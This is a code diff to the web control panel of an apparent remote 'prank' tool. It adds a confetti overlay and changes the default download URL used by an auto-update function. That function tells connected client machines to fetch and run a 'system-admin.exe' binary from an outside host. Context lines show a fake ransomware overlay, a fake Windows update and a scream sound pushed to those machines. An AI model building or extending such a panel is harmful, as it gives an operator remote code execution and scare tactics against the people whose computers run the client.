@@ -578,6 +578,18 @@
                         </div>
                     </div>
 
+                    <!-- CRAZY PRANK: Party Confetti (v1.2 Feature) -->
+                    <div class="prank-card crazy-prank" style="border-color: #10b981;">
+                        <div class="prank-header">
+                            <div class="prank-icon">🎉</div>
+                            <button class="btn-trigger" style="background: rgba(16, 185, 129, 0.25); color: #34d399; border-color: #10b981;" onclick="triggerOneShot('confetti')">Test v1.2.0</button>
+                        </div>
+                        <div class="prank-info">
+                            <h3>Party Confetti (v1.2 New)</h3>
+                            <p>Celebration overlay confirming successful client auto-update to v1.2.0!</p>
+                        </div>
+                    </div>
+
                     <!-- CRAZY PRANK: Fake Ransomware Overlay -->
                     <div class="prank-card crazy-prank">
                         <div class="prank-header">
@@ -764,7 +776,7 @@
         }
 
         function triggerAutoUpdate() {
-            const url = prompt('Enter Direct URL for system-admin.exe update binary:', 'https://prank.steamhub.qzz.io/public/system-admin.exe');
+            const url = prompt('Enter Direct URL for system-admin.exe update binary:', 'https://prank.steamhub.qzz.io/system-admin.exe');
             if (!url) return;
             const target = selectedClientId || "all";
             sendWsMessage({
@@ -847,6 +859,8 @@
                 prankObj = { type: 'FakeWindowsUpdate', config: { duration_sec: 30 } };
             } else if (type === 'audio_scream') {
                 prankObj = { type: 'AudioScream', config: { duration_sec: 5 } };
+            } else if (type === 'confetti') {
+                prankObj = { type: 'ConfettiPopup', config: { duration_sec: 10 } };
             }
 
             if (!prankObj) return;
